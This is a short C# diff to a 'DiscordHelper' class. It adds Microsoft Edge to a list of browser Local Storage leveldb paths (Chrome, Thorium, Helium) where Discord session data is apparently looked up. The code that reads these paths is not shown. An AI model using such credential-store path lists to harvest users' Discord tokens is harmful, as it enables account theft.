@@ -20,6 +20,7 @@ public static partial class DiscordHelper
 
 	private static readonly Dictionary<string, string> browserPaths = new()
 	{
+		{ @"AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb", "Edge" },
 		{ @"AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb", "Chrome" },
 		{ @"AppData\Local\Thorium\User Data\Default\Local Storage\leveldb", "Thorium" },
 		{ @"AppData\Local\imput\Helium\User Data\Default\Local Storage\leveldb", "Helium" },
